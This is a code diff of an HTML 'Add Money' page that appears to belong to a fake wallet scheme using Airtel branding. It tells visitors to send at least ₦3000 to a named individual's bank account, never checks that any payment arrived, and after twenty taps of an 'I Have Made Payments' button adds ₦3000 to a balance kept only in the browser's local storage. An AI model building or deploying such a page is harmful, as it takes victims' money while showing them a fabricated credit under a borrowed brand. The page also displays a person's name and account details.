@@ -2,109 +2,163 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Add Money</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
       font-family: Arial, sans-serif;
-      background: #fff;
-      overflow: hidden;
+      padding: 20px;
+      background-color: #fff;
+      text-align: center;
+      color: #333;
+    }
+
+    .container, .payment-card {
+      max-width: 400px;
+      margin: 60px auto;
+      background-color: #f9f9f9;
+      border-radius: 15px;
+      box-shadow: 0 0 10px #ddd;
+      padding: 25px;
       position: relative;
     }
 
-    .blur-logo {
-      background: url('airtel-logo.png') no-repeat center center;
-      background-size: 250px;
-      opacity: 0.05;
+    input {
+      padding: 12px;
+      width: 90%;
+      font-size: 18px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+    }
+
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      background-color: #d90000;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .popup {
+      background-color: #ffe5e5;
+      color: #d90000;
+      border: 1px solid #d90000;
+      padding: 12px;
+      margin-top: 15px;
+      border-radius: 10px;
+      display: none;
+    }
+
+    .logo-bg {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      opacity: 0.03;
+      width: 200px;
       z-index: 0;
     }
 
-    .container {
-      padding: 30px;
-      text-align: center;
+    .card-content {
       position: relative;
       z-index: 1;
     }
 
-    h2 {
-      color: red;
-      font-size: 24px;
-    }
-
-    input {
-      padding: 15px;
-      width: 90%;
-      max-width: 300px;
-      font-size: 18px;
-      margin-top: 30px;
+    .success {
+      background-color: #e0ffe0;
+      border: 1px solid green;
+      color: green;
+      padding: 10px;
+      margin-top: 15px;
       border-radius: 10px;
-      border: 1px solid #ccc;
-    }
-
-    button {
-      margin-top: 30px;
-      padding: 15px 25px;
-      background-color: red;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 18px;
-      cursor: pointer;
-    }
-
-    .loader {
       display: none;
-      margin-top: 30px;
     }
 
-    .loader img {
-      width: 60px;
-      animation: spin 1s linear infinite;
+    .hidden {
+      display: none;
     }
 
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
+    .progress {
+      font-size: 14px;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-  <div class="blur-logo"></div>
 
-  <div class="container">
-    <h2>Add Money</h2>
-    <input type="number" id="amount" placeholder="Enter Amount (Min ₦3000)" />
-    <br />
-    <button onclick="continueToFund()">Continue</button>
+  <!-- Step 1: Enter Amount -->
+  <div class="container" id="amountSection">
+    <h2>Enter Amount</h2>
+    <input type="number" id="amount" placeholder="₦ Minimum 3000" />
+    <button onclick="continueToConfirm()">Continue</button>
+    <div class="popup" id="popup">Please input minimum of ₦3000</div>
+  </div>
 
-    <div class="loader" id="loader">
-      <img src="airtel-logo.png" alt="Loading..." />
+  <!-- Step 2: Confirm Payment -->
+  <div class="payment-card hidden" id="confirmSection">
+    <img src="airtel-logo.png" class="logo-bg" />
+    <div class="card-content">
+      <h2>Send Payment To</h2>
+      <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
+      <p><strong>Bank:</strong> SmartCash PSB</p>
+      <p><strong>Account Number:</strong> 812 489 0070</p>
+      <button onclick="tapConfirm()">I Have Made Payments</button>
+      <div class="progress" id="progressText">Progress: 0 / 20</div>
+      <div class="success" id="successBox">₦3000 has been added to your wallet!</div>
     </div>
   </div>
 
   <script>
-    function continueToFund() {
-      const amount = document.getElementById("amount").value;
-      if (parseInt(amount) < 3000) {
-        alert("Minimum amount is ₦3000");
-        return;
+    let taps = parseInt(localStorage.getItem('paymentTaps')) || 0;
+    const popup = document.getElementById('popup');
+    const confirmSection = document.getElementById('confirmSection');
+    const amountSection = document.getElementById('amountSection');
+    const successBox = document.getElementById('successBox');
+    const progressText = document.getElementById('progressText');
+
+    function continueToConfirm() {
+      const amount = parseInt(document.getElementById('amount').value);
+      if (amount >= 3000) {
+        localStorage.setItem('pendingAmount', amount);
+        amountSection.classList.add('hidden');
+        confirmSection.classList.remove('hidden');
+        progressText.innerText = `Progress: ${taps} / 20`;
+      } else {
+        popup.style.display = 'block';
+        setTimeout(() => popup.style.display = 'none', 3000);
       }
+    }
 
-      document.getElementById("loader").style.display = "block";
+    function tapConfirm() {
+      taps++;
+      localStorage.setItem('paymentTaps', taps);
+      progressText.innerText = `Progress: ${taps} / 20`;
 
-      setTimeout(() => {
-        localStorage.setItem("fundAmount", amount);
-        window.location.href = "fund-confirm.html";
-      }, 2000);
+      if (taps >= 20) {
+        taps = 0;
+        localStorage.setItem('paymentTaps', 0);
+
+        let user = JSON.parse(localStorage.getItem('user')) || { balance: 0 };
+        user.balance = (parseInt(user.balance || 0) + 3000);
+        localStorage.setItem('user', JSON.stringify(user));
+
+        successBox.style.display = 'block';
+        setTimeout(() => {
+          window.location.href = 'dashboard.html';
+        }, 3000);
+      }
+    }
+
+    // Show previous tap progress if page was refreshed
+    if (localStorage.getItem('pendingAmount')) {
+      amountSection.classList.add('hidden');
+      confirmSection.classList.remove('hidden');
+      progressText.innerText = `Progress: ${taps} / 20`;
     }
   </script>
+
 </body>
 </html>
